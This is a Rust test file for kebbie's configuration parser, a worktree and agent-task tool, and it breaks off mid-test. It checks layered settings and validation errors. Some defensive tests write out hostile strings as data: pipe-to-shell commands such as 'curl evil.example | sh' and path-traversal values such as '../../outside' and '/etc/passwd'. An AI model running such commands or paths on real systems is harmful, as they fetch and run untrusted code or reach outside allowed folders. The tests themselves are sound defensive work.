use std::path::{Path, PathBuf};

use toml::Table;

use super::*;
use crate::status::Group;

#[test]
fn keys_live_in_config_toml_only_and_kebbie_config_shows_each_with_why_an_entry_was_ignored() {
    let config = machine("[keys]\ninbox = \"I\"\nchat = \"p\"\nback = \"x\"\nnew = 3\n");
    assert_eq!(config.keys, [("back".to_string(), "x".to_string()), ("chat".to_string(), "p".to_string()), ("inbox".to_string(), "I".to_string()), ("new".to_string(), "integer value".to_string())]);
    let refused = parse_repo("[keys]\ninbox = \"I\"\n", "app.toml").unwrap_err();
    assert!(refused.contains("keys: applies to every repo, so it lives in config.toml; set [keys] in"), "{refused}");
    let dir = crate::sh::test_dir("config-keys");
    let file = dir.join("config.toml");
    std::fs::write(&file, "[keys]\ninbox = \"I\"\nchat = \"p\"\nserver = \"W\"\n").unwrap();
    let shown = describe(&Loaded { machine: file, repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("keys.inbox = \"I\"  (machine config)") && shown.contains("keys.new = \"n\"  (default)"), "{shown}");
    assert!(shown.contains("ignored: keys.chat: p is taken by push"), "{shown}");
    assert!(shown.contains("the board's W key runs in a server tab"), "the descriptions name the key in effect: {shown}");
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn kebbie_config_describes_the_routines_and_lists_config_tomls_and_the_repos() {
    let dir = crate::sh::test_dir("config-routines");
    let (file, repo) = (dir.join("config.toml"), dir.join("app.toml"));
    std::fs::write(&file, "[[routines]]\nid = \"disk\"\ntitle = \"Disk\"\nrepo = \"~/code/infra\"\nat = \"07:00\"\nprompt = \"p\"\n").unwrap();
    std::fs::write(&repo, "[[routines]]\nid = \"deps\"\ntitle = \"Updates\"\nat = \"mon 07:00\"\nprompt = \"p\"\nmode = \"plan\"\nenabled = false\n").unwrap();
    let shown = describe(&Loaded { machine: file, repo: Some(repo), settings: settings(&Worktree::default(), &Machine::default()) });
    assert!(shown.contains("[[routines]]  (config.toml or a repo config)\n  Checks kebbie runs on a schedule") && shown.contains("with the keys id, title, repo, every, at, prompt, mode, push, enabled"), "{shown}");
    assert!(shown.contains("\n  disk: daily at 07:00 in ~/code/infra, report\n  deps: mon at 07:00 in app, plan, off\n"), "{shown}");
    let _ = std::fs::remove_dir_all(dir);
}

const MACHINE: &str = "[board.backlog]\nsources = [\"vault\", \"linear\"]\n\n[worktree]\nsetup_skill = \"my-tools:set-up-worktree\"\ndev_server = \"bin/dev\"\n";
const REPO: &str = "[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\ndev_server = \"npm run dev\"\n\n[[actions]]\nkey = \"B\"\ntitle = \"Build\"\nrun = \"cargo build\"\n";

fn machine(text: &str) -> Machine {
    parse_machine(text, "config.toml").unwrap()
}

fn repo(text: &str) -> Worktree {
    parse_repo(text, "app.toml").unwrap()
}

fn unknown_machine(text: &str) -> String {
    machine(text);
    unknown_in_file(text, "config.toml", &MACHINE_KEYS).join("\n")
}

fn unknown_repo(text: &str) -> String {
    repo(text);
    unknown_in_file(text, "app.toml", &REPO_KEYS).join("\n")
}

#[test]
fn a_repo_configs_paths_and_skill_names_stay_inside_their_folders() {
    for good in ["pyproject.toml", "crates/app/Cargo.toml", "./uv.lock"] {
        assert!(inside(good), "{good}");
    }
    for bad in ["", "../x.toml", "a/../../x", "/etc/passwd", "a/.."] {
        assert!(!inside(bad), "{bad}");
    }
    for good in ["work-rules", "kebbie:work-rules", "my-tools:set-up-worktree"] {
        assert!(skill_name(good), "{good}");
    }
    for bad in ["..", "kebbie:..", "kebbie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
        assert!(!skill_name(bad), "{bad}");
    }
    for file in ["/home/u/code/team/RULES.md", "~/notes/setup.MD"] {
        assert_eq!(repo(&format!("[task]\nrules_skill = {file:?}\n[worktree]\nsetup_skill = {file:?}\n")).rules_skill.as_deref(), Some(file), "a Markdown file by an absolute or ~ path");
    }
    for not_a_file in ["code/RULES.md", "/home/u/RULES.txt", "~/RULES"] {
        assert!(parse_repo(&format!("[task]\nrules_skill = {not_a_file:?}\n"), "app.toml").unwrap_err().contains("or a path to a .md file starting with / or ~/"), "{not_a_file}");
    }
    assert_eq!(skill_path("kebbie:work-rules"), None);
    assert_eq!(skill_path("/x/RULES.md"), Some(PathBuf::from("/x/RULES.md")));
    assert_eq!(skill_path("~/RULES.md"), Some(PathBuf::from(std::env::var("HOME").unwrap()).join("RULES.md")));
    assert_eq!((follow("kebbie:set-up-worktree"), follow("/x/SETUP.md")), ("run the skill `kebbie:set-up-worktree` and follow it".to_string(), "read `/x/SETUP.md` and follow it".to_string()));
    assert_eq!((rules_named("kebbie:work-rules"), rules_named("/x/RULES.md")), ("the skill `kebbie:work-rules`".to_string(), "the rules in `/x/RULES.md`".to_string()));
    let refused = parse_repo("[task]\nrules_skill = \"kebbie:../../outside\"\n", "app.toml").unwrap_err();
    assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
    assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", "app.toml").is_err());
}

#[test]
fn a_released_worktree_loses_its_target_by_default_and_a_repo_names_its_own_folders_inside_it() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).clean_on_release, Setting { value: vec!["target".to_string()], layer: Layer::Default });
    let own = settings(&repo("[worktree]\nclean_on_release = [\"target\", \"node_modules/.cache\", \".next\"]\n"), &machine("[worktree]\nclean_on_release = []\n"));
    assert_eq!(own.clean_on_release, Setting { value: ["target", "node_modules/.cache", ".next"].map(str::to_string).to_vec(), layer: Layer::Repo });
    assert_eq!(settings(&Worktree::default(), &machine("[worktree]\nclean_on_release = []\n")).clean_on_release.value, Vec::<String>::new());
    for outside in ["../other", "/tmp", "", ".git", "a/../../b", "./target"] {
        let refused = parse_repo(&format!("[worktree]\nclean_on_release = [{outside:?}]\n"), "app.toml").unwrap_err();
        assert!(refused.contains("must be a folder inside the worktree"), "{outside}: {refused}");
    }
}

#[test]
fn ci_watch_is_on_by_default_and_a_repo_can_turn_it_off() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).ci_watch, Setting { value: true, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[ci]\nwatch = false\n")).ci_watch, Setting { value: false, layer: Layer::Machine });
    let off = settings(&repo("[ci]\nwatch = false\n"), &machine("[ci]\nwatch = true\n"));
    assert_eq!(off.ci_watch, Setting { value: false, layer: Layer::Repo });
    assert!(parse_machine("[ci]\nwatch = \"yes\"\n", "config.toml").unwrap_err().contains("ci.watch: must be true or false"));
    assert!(unknown_repo("[ci]\npoll = 10\n").contains("ci.poll: unknown key; known keys here: watch"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: off });
    assert!(shown.contains("ci.watch = false  (repo config)"), "{shown}");
}

#[test]
fn comments_are_watched_for_a_week_by_default_and_a_repo_can_change_either() {
    let default = settings(&Worktree::default(), &Machine::default());
    assert_eq!((default.comments_watch.value, default.comments_days.value), (true, 7));
    let set = settings(&repo("[comments]\nwatch = false\nwatch_days = 14\n"), &machine("[comments]\nwatch_days = 3\n"));
    assert_eq!((set.comments_watch.clone(), set.comments_days.clone()), (Setting { value: false, layer: Layer::Repo }, Setting { value: 14, layer: Layer::Repo }));
    assert!(parse_machine("[comments]\nwatch_days = 0\n", "config.toml").unwrap_err().contains("comments.watch_days: must be a whole number of days, 1 to 90"));
    assert!(unknown_repo("[comments]\npoll = 10\n").contains("comments.poll: unknown key; known keys here: watch, watch_days"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: set });
    assert!(shown.contains("comments.watch = false  (repo config)") && shown.contains("comments.watch_days = 14  (repo config)"), "{shown}");
}

#[test]
fn the_permission_mode_is_claudes_own_default_until_set_and_a_repo_wins_over_the_machine() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).permission_mode, Setting { value: None, layer: Layer::Default });
    let machine_wide = settings(&Worktree::default(), &machine("[task]\npermission_mode = \"bypassPermissions\"\n"));
    assert_eq!(machine_wide.permission_mode, Setting { value: Some("bypassPermissions".to_string()), layer: Layer::Machine });
    let own = settings(&repo("[task]\npermission_mode = \"acceptEdits\"\n"), &machine("[task]\npermission_mode = \"bypassPermissions\"\n"));
    assert_eq!(own.permission_mode, Setting { value: Some("acceptEdits".to_string()), layer: Layer::Repo });
    for mode in PERMISSION_MODES {
        assert_eq!(repo(&format!("[task]\npermission_mode = \"{mode}\"\n")).permission_mode.as_deref(), Some(mode));
    }
    let refused = parse_machine("[task]\npermission_mode = \"yolo\"\n", "config.toml").unwrap_err();
    assert!(refused.contains("task.permission_mode: \"yolo\" is not a Claude Code permission mode; use \"default\", \"acceptEdits\", \"plan\", \"auto\", \"dontAsk\", \"bypassPermissions\""), "{refused}");
    assert!(parse_repo("[task]\npermission_mode = \"bypasspermissions\"\n", "app.toml").unwrap_err().contains("is not a Claude Code permission mode"), "a mode is spelled as Claude Code spells it");
    assert!(parse_repo("[task]\npermission_mode = true\n", "app.toml").unwrap_err().contains("task.permission_mode: must be a string"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
    assert!(shown.contains("task.permission_mode = \"acceptEdits\"  (repo config)") && shown.contains("never pushes nor approves"), "{shown}");
}

#[test]
fn a_repos_test_commands_win_over_the_machines_and_add_to_the_built_in_ones() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).test_commands, Setting { value: Vec::new(), layer: Layer::Default });
    let own = settings(&repo("[task]\ntest_commands = [\"bin/test\", \" make check \"]\n"), &machine("[task]\ntest_commands = [\"just test\"]\n"));
    assert_eq!(own.test_commands, Setting { value: vec!["bin/test".to_string(), "make check".to_string()], layer: Layer::Repo });
    assert!(crate::evidence::commands(&own.test_commands.value).iter().any(|command| command == "cargo test"));
    assert!(parse_repo("[task]\ntest_commands = \"bin/test\"\n", "app.toml").unwrap_err().contains("task.test_commands: must be a list of strings"));
    assert!(parse_repo("[task]\ntest_commands = [\" \"]\n", "app.toml").unwrap_err().contains("must not be empty"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
    assert!(shown.contains("task.test_commands = [\"bin/test\", \"make check\"]  (repo config)") && shown.contains("\"cargo test\""), "{shown}");
}

#[test]
fn also_noticed_files_by_default_and_a_repo_wins_over_the_machine() {
    assert_eq!(settings(&Worktree::default(), &Machine::default()).also_noticed, Setting { value: AlsoNoticed::Backlog, layer: Layer::Default });
    assert_eq!(settings(&Worktree::default(), &machine("[task]\nalso_noticed = \"ask\"\n")).also_noticed, Setting { value: AlsoNoticed::Ask, layer: Layer::Machine });
    let own = settings(&repo("[task]\nalso_noticed = \"fix\"\n"), &machine("[task]\nalso_noticed = \"ask\"\n"));
    assert_eq!(own.also_noticed, Setting { value: AlsoNoticed::Fix, layer: Layer::Repo });
    let refused = parse_repo("[task]\nalso_noticed = \"ignore\"\n", "app.toml").unwrap_err();
    assert!(refused.contains("task.also_noticed: \"ignore\" is not a choice; use \"backlog\", \"fix\" or \"ask\""), "{refused}");
    assert!(parse_machine("[task]\nalso_noticed = true\n", "config.toml").unwrap_err().contains("task.also_noticed: must be a string"));
    assert!(unknown_repo("[task]\nnoticed = \"fix\"\n").contains("known keys here: rules_skill, test_commands, also_noticed, permission_mode"));
    let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: own });
    assert!(shown.contains("task.also_noticed = \"fix\"  (repo config)") && shown.contains("outside its task"), "{shown}");
}

#[test]
fn an_empty_file_is_every_default() {
    assert_eq!(machine(""), Machine::default());
    assert_eq!(repo(""), Worktree::default());
    let missing = std::env::temp_dir().join(format!("kebbie-config-missing-{}.toml", std::process::id()));
    assert_eq!(load_machine(&missing).unwrap(), Machine::default());
    assert_eq!(load_repo(&missing).unwrap(), Worktree::default());
    let defaults = settings(&Worktree::default(), &Machine::default());
    assert_eq!(defaults.sources, Setting { value: vec![Source::Local], layer: Layer::Default }, "a fresh install has a working Backlog column");
    assert_eq!(defaults.setup_skill, Setting { value: DEFAULT_SETUP_SKILL.to_string(), layer: Layer::Default });
    assert_eq!(defaults.setup_command, Setting { value: None, layer: Layer::Default }, "none means bin/setup-worktree when it exists");
    assert_eq!(defaults.dev_server, Setting { value: None, layer: Layer::Default });
    assert_eq!(defaults.dev_worker, Setting { value: None, layer: Layer::Default });
    assert_eq!(defaults.dev_url, Setting { value: Some(DEFAULT_DEV_URL.to_string()), layer: Layer::Default });
    assert_eq!(defaults.rules_skill, Setting { value: DEFAULT_RULES_SKILL.to_string(), layer: Layer::Default });
    assert_eq!(defaults.review_model, Setting { value: None, layer: Layer::Default });
    assert_eq!(defaults.notify_command, Setting { value: None, layer: Layer::Default }, "no command, no notifications");
}

#[test]
fn reads_the_machine_keys() {
    let config = machine(MACHINE);
    assert_eq!(config.sources, Some(vec![Source::Vault, Source::Linear]));
    assert_eq!(config.worktree.setup_skill.as_deref(), Some("my-tools:set-up-worktree"));
    assert_eq!(config.worktree.dev_server.as_deref(), Some("bin/dev"));
    assert_eq!(machine("[board.backlog]\nsources = []\n").sources, Some(Vec::new()));
    assert_eq!(settings(&Worktree::default(), &machine("[board.backlog]\nsources = []\n")).sources.value, Vec::new(), "an explicit empty list turns the backlog off");
    assert_eq!(machine("[board.backlog]\nsources = [\"local\", \"vault\"]\n").sources, Some(vec![Source::Local, Source::Vault]));
}

#[test]
fn a_repo_config_holds_worktree_and_actions_together() {
    let own = repo(REPO);
    assert_eq!(own.setup_skill.as_deref(), Some("app-tools:set-up-worktree"));
    assert_eq!(own.dev_server.as_deref(), Some("npm run dev"));
    let (actions, errors) = crate::actions::parse(REPO, "app.toml");
    assert!(errors.is_empty(), "{errors:?}");
    assert_eq!(actions[0].title, "Build");
}

#[test]
fn each_key_comes_from_the_highest_layer_that_sets_it() {
    let both = settings(&repo(REPO), &machine(MACHINE));
    assert_eq!(both.setup_skill, Setting { value: "app-tools:set-up-worktree".to_string(), layer: Layer::Repo });
    assert_eq!(both.dev_server, Setting { value: Some("npm run dev".to_string()), layer: Layer::Repo });
    assert_eq!(both.sources.layer, Layer::Machine);
    let skill_only = settings(&repo("[worktree]\nsetup_skill = \"app-tools:set-up-worktree\"\n"), &machine(MACHINE));
    assert_eq!(skill_only.setup_skill.layer, Layer::Repo);
    assert_eq!(skill_only.dev_server, Setting { value: Some("bin/dev".to_string()), layer: Layer::Machine });
    let server_only = settings(&repo("[worktree]\ndev_server = \"npm run dev\"\n"), &machine(MACHINE));
    assert_eq!(server_only.setup_skill, Setting { value: "my-tools:set-up-worktree".to_string(), layer: Layer::Machine });
    assert_eq!(server_only.dev_server.layer, Layer::Repo);
    let machine_only = settings(&Worktree::default(), &machine(MACHINE));
    assert_eq!((machine_only.setup_skill.layer, machine_only.dev_server.layer), (Layer::Machine, Layer::Machine));
    let repo_only = settings(&repo(REPO), &Machine::default());
    assert_eq!((repo_only.setup_skill.layer, repo_only.dev_server.layer, repo_only.sources.layer), (Layer::Repo, Layer::Repo, Layer::Default));
}

fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("kebbie-config-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

#[test]
fn a_worktree_reads_the_repo_config_named_after_its_main_checkout() {
    let root = scratch("repo");
    let dir = root.join("app");
    std::fs::create_dir_all(&dir).unwrap();
    crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
    crate::repo::git(&dir, &["-c", "user.name=Ada", "-c", "user.email=ada@example.com", "commit", "--quiet", "--allow-empty", "-m", "first"]).unwrap();
    let worktree = root.join("wt1.app");
    crate::repo::git(&dir, &["worktree", "add", "--quiet", "--detach", &worktree.to_string_lossy()]).unwrap();
    let repos = root.join("repos");
    assert_eq!(repo_file_in(&repos, &worktree), repos.join("app.toml"));
    assert_eq!(repo_file_in(&repos, &dir), repos.join("app.toml"));
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_kebbie_toml_inside_the_repo_is_never_read() {
    let root = scratch("ignored");
    let dir = root.join("app");
    std::fs::create_dir_all(&dir).unwrap();
    crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
    std::fs::write(dir.join(".kebbie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
    let file = repo_file_in(&root.join("repos"), &dir);
    assert!(!file.starts_with(&dir), "{}", file.display());
    assert_eq!(load_repo(&file).unwrap(), Worktree::default());
    assert_eq!(settings(&load_repo(&file).unwrap(), &Machine::default()).dev_server, Setting { value: None, layer: Layer::Default });
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn a_symlinked_repo_config_loads_and_shows_its_target() {
    let root = scratch("link");
    let (team, repos) = (root.join("team/kebbie"), root.join("repos"));
    std::fs::create_dir_all(&team).unwrap();
    std::fs::create_dir_all(&repos).unwrap();
    std::fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
    std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
    assert_eq!(load_repo(&repos.join("app.toml")).unwrap().dev_server.as_deref(), Some("bin/dev"));
    assert_eq!(shown(&repos.join("app.toml")), format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display()));
    std::os::unix::fs::symlink("../team/kebbie/gone.toml", repos.join("gone.toml")).unwrap();
    assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kebbie/gone.toml").display()));
    assert_eq!(shown(&repos.join("none.toml")), format!("{} (not found)", repos.join("none.toml").display()));
    std::fs::remove_dir_all(root).unwrap();
}

#[test]
fn unknown_keys_are_named_with_the_file_and_ignored_while_bad_values_still_fail() {
    let warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/config.toml", &MACHINE_KEYS);
    let all = "board, worktree, task, review, notify, vault, update, restart, keeper, recover, machine, hub, keys, ci, comments, routines, report, issues";
    assert_eq!(warned("colour = 1
"), [format!("/home/u/.config/kebbie/config.toml: colour: unknown key; known keys here: {all}")]);
    assert_eq!(warned("[backlog]\nsources = []\n"), [format!("/home/u/.config/kebbie/config.toml: backlog: unknown key; known keys here: {all}")]);
    assert_eq!(warned("[board.backlog]\nsource = []\n"), ["/home/u/.config/kebbie/config.toml: board.backlog.source: unknown key; known keys here: sources, ongoing"]);
    assert_eq!(machine("colour = 1\n[backlog]\nsources = []\n[board]\ncolumns = 3\n[board.backlog]\nsource = []\n"), Machine::default(), "unknown keys and tables are ignored");
    let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
    assert_eq!(error("colour = 1\n[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kebbie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
    assert!(error("[board.backlog]\nsources = \"vault\"\n").contains("board.backlog.sources: must be a list of strings"));
    assert!(error("[board.backlog]\nsources = [\"vault\", \"vault\"]\n").contains("listed twice"));
    assert!(unknown_machine("[repos.app]\nsetup = [\"x\"]\n").contains("repos: unknown key"));
    assert!(unknown_machine("[worktree]\nsetup = \"x\"\n").contains("worktree.setup: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name"));
    assert!(error("[worktree]\ndev_server = [\"bin/dev\"]\n").contains("worktree.dev_server: must be a string"));
    assert!(error("[worktree]\nsetup_skill = \" \"\n").contains("worktree.setup_skill: must not be empty"));
    assert!(error("not toml [").starts_with("/home/u/.config/kebbie/config.toml: TOML parse error"));
    let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
    assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kebbie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board] groups and [board.backlog] sources and ongoing in "));
    assert!(repo_error("colour = 1\n[ci]\nwatch = \"yes\"\n").contains("ci.watch: must be true or false"), "a known key with the wrong type still fails in a repo config");
    let repo_warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/repos/app.toml", &REPO_KEYS);
    assert_eq!(repo_warned("colour = 1\n"), ["/home/u/.config/kebbie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review, ci, comments, docs, routines"]);
    assert_eq!(repo_warned("[worktree]\nport = 3000\n"), ["/home/u/.config/kebbie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name, clean_on_release"]);
    assert_eq!(repo("colour = 1\n[lint]\nstrict = true\n[worktree]\nport = 3000\ndev_server = \"bin/dev\"\n").dev_server, Some("bin/dev".to_string()), "a repo config reads its known keys past unknown ones");
}

#[test]
fn the_files_load_past_a_key_from_a_newer_kebbie_and_say_which() {
    let dir = scratch("newer");
    let config = dir.join("config.toml");
    std::fs::write(&config, "[update]\nchannel = \"main\"\nmirror = \"x\"\n\n[board]\nlanes = 2\n\n[signals]\nsample = 0.5\n").unwrap();
    let (machine, unknown) = check_machine(&config).unwrap();
    assert_eq!(machine.channel, Some(Channel::Main));
    assert_eq!(unknown.iter().map(|line| line.split(": ").nth(1).unwrap_or_default()).collect::<Vec<_>>(), ["signals", "board.lanes", "update.mirror"]);
    assert_eq!(load_machine(&config).unwrap().channel, Some(Channel::Main));
    let file = dir.join("app.toml");
    std::fs::write(&file, "[review]\nmodel = \"opus\"\neffort = \"high\"\n\n[lint]\nstrict = true\n").unwrap();
    let (worktree, unknown) = check_repo(&file).unwrap();
    assert_eq!(worktree.review_model.as_deref(), Some("opus"));
    assert_eq!(unknown.len(), 2, "{unknown:?}");
    assert!(unknown.iter().all(|line| line.starts_with(&file.display().to_string())), "{unknown:?}");
    std::fs::write(&config, "[restart]\nidle_minutes = \"soon\"\n").unwrap();
    assert!(check_machine(&config).unwrap_err().contains("restart.idle_minutes: must be a whole number"), "a known key with the wrong type still fails");
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn the_update_channel_reads_past_everything_else_in_config_toml() {
    let dir = scratch("channel");
    let config = dir.join("config.toml");
    assert_eq!(channel_in(&config).unwrap(), Channel::Release, "no file is the default channel");
    std::fs::write(&config, "colour = 1\n\n[update]\nchannel = \"main\"\nmirror = \"x\"\n\n[signals]\nsample = 0.5\n\n[restart]\nidle_minutes = \"soon\"\n").unwrap();
    assert_eq!(channel_in(&config).unwrap(), Channel::Main, "unknown keys and tables and a bad value elsewhere leave update alone");
    std::fs::write(&config, "[update]\nchannel = \"stable\"\n").unwrap();
    assert!(channel_in(&config).unwrap_err().contains("update.channel: \"stable\" is not a channel"));
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn the_review_model_comes_from_either_file_the_repo_first() {
    let from_machine = machine("[review]\nmodel = \"opus\"\n");
    assert_eq!(settings(&Worktree::default(), &from_machine).review_model, Setting { value: Some("opus".to_string()), layer: Layer::Machine });
    let both = settings(&repo("[review]\nmodel = \"sonnet\"\n"), &from_machine);
    assert_eq!(both.review_model, Setting { value: Some("sonnet".to_string()), layer: Layer::Repo });
    assert!(unknown_repo("[review]\nmodle = \"opus\"\n").contains("review.modle: unknown key; known keys here: model, auto"));
    assert!(parse_machine("[review]\nmodel = \"\"\n", "config.toml").unwrap_err().contains("review.model: must not be empty"));
    let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both };
    assert!(describe(&loaded).contains("review.model = \"sonnet\"  (repo config)"));
    let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
    assert!(describe(&default).contains("review.model = none  (default)\n  The model the default reviewer (review.profile) runs on"));
}

#[test]
fn review_profile_names_the_default_reviewer_and_review_second_a_second_opinion_offered_or_always() {
    let defaults = settings(&Worktree::default(), &Machine::default());
    assert_eq!((defaults.review_profile.value.as_str(), &defaults.review_second.value), (crate::profiles::REVIEWER, &Second::None), "the built-in reviewer and no second opinion");
    let own = settings(&repo("[review]\nprofile = \"careful-review\"\nsecond = \"codex-review\"\n"), &machine("[review]\nsecond = \"always codex-review\"\n"));
    assert_eq!((own.review_profile.value.as_str(), own.review_profile.layer), ("careful-review", Layer::Repo));
    assert_eq!(own.review_second, Setting { value: Second::Offered("codex-review".to_string()), layer: Layer::Repo }, "a repo wins over the machine");
    assert_eq!(settings(&Worktree::default(), &machine("[review]\nsecond = \"always codex-review\"\n")).review_second.value, Second::Always("codex-review".to_string()));
    assert_eq!(Second::parse("none"), Ok(Second::None));
    assert_eq!(Second::Always("codex-review".to_string()).key(), "always codex-review");
    assert!(Second::parse("often codex-review").unwrap_err().contains("review.second: \"often codex-review\" is not a choice"));
    assert!(parse_repo("[review]\nprofile = \"Bad Name\"\n", "app.toml").unwrap_err().contains("review.profile: \"Bad Name\" is not a profile name"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: own });
    assert!(shown.contains("review.profile = \"careful-review\"  (repo config)") && shown.contains("review.second = \"codex-review\"  (repo config)\n  A second opinion from another review profile"), "{shown}");
}

#[test]
fn review_auto_suggests_by_default_and_a_repo_wins_over_the_machine() {
    let defaults = settings(&Worktree::default(), &Machine::default());
    assert_eq!(defaults.review_auto, Setting { value: ReviewAuto::Suggest, layer: Layer::Default });
    let own = settings(&repo("[review]\nauto = \"require\"\n"), &machine("[review]\nauto = \"run\"\n"));
    assert_eq!(own.review_auto, Setting { value: ReviewAuto::Require, layer: Layer::Repo });
    assert_eq!(settings(&Worktree::default(), &machine("[review]\nauto = \"run\"\n")).review_auto.value, ReviewAuto::Run);
    assert!(parse_repo("[review]\nauto = \"yes\"\n", "app.toml").unwrap_err().contains("review.auto: \"yes\" is not a choice; use \"suggest\", \"run\" or \"require\""));
    assert!(unknown_repo("[review]\nskip = []\n").contains("review.skip: unknown key; known keys here: model, auto"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: defaults });
    assert!(shown.contains("review.auto = \"suggest\"  (default)\n  What kebbie does when the assessor"), "{shown}");
}

#[test]
fn the_notify_command_is_machine_config_only() {
    let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"\n");
    assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KEBBIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
    let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
    assert!(refused.starts_with("/home/u/.config/kebbie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
    assert!(parse_repo("[notify]\n", "app.toml").unwrap_err().contains("lives in config.toml"));
    let sneaked = Worktree { notify_command: Some("bin/notify".to_string()), ..Worktree::default() };
    assert_eq!(settings(&sneaked, &from_machine).notify_command.layer, Layer::Machine, "the repo layer is never read for it");
    assert!(unknown_machine("[notify]\ncmd = \"x\"\n").contains("notify.cmd: unknown key; known keys here: command"));
    assert!(parse_machine("[notify]\ncommand = \" \"\n", "config.toml").unwrap_err().contains("notify.command: must not be empty"));
    assert!(parse_machine("[notify]\ncommand = [\"x\"]\n", "config.toml").unwrap_err().contains("notify.command: must be a string"));
    assert!(parse_machine("notify = \"x\"\n", "config.toml").unwrap_err().contains("notify: must be a table"));
    let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &from_machine) };
    assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
    let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
    assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kebbie runs"));
    assert!(describe(&default).contains("config.toml only."));
}

#[test]
fn board_groups_take_the_listed_order_and_the_rest_follow_by_default() {
    let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
    let set = settings(&Worktree::default(), &machine("[board]\ngroups = [\"ready-to-push\", \"waiting-for-work\"]\n"));
    assert_eq!(set.groups.value, [Group::ReadyToPush, Group::Idle, Group::NeedsYou, Group::Working, Group::InReview, Group::CiRunning, Group::Queued]);
    assert_eq!(settings(&Worktree::default(), &Machine::default()).groups.value, Group::ALL, "no list keeps today's order");
    assert_eq!(error("[board]\ngroups = [\"needs-me\"]\n"), "/home/u/.config/kebbie/config.toml: board.groups: \"needs-me\" is not a group; use \"needs-you\", \"working\", \"in-review\", \"ready-to-push\", \"ci-running\", \"waiting-for-work\", \"queued\"");
    assert!(error("[board]\ngroups = [\"queued\", \"queued\"]\n").contains("board.groups: \"queued\" is listed twice"));
    assert!(unknown_machine("[board]\ncolumns = []\n").contains("board.columns: unknown key; known keys here: groups, backlog"));
    let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
    assert!(shown.contains("board.groups = [\"ready-to-push\", \"waiting-for-work\", \"needs-you\", \"working\", \"in-review\", \"ci-running\", \"queued\"]  (machine config)\n  The order of the Work column's groups"), "{shown}");
}

#[test]
fn ongoing_sits_on_top_unless_config_toml_moves_or_hides_it() {
    let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
    assert_eq!(settings(&Worktree::default(), &Machine::default()).ongoing.value, OngoingAt::Top);
    assert_eq!(machine("[board.backlog]\nongoing = \"bottom\"\n").ongoing, Some(OngoingAt::Bottom));
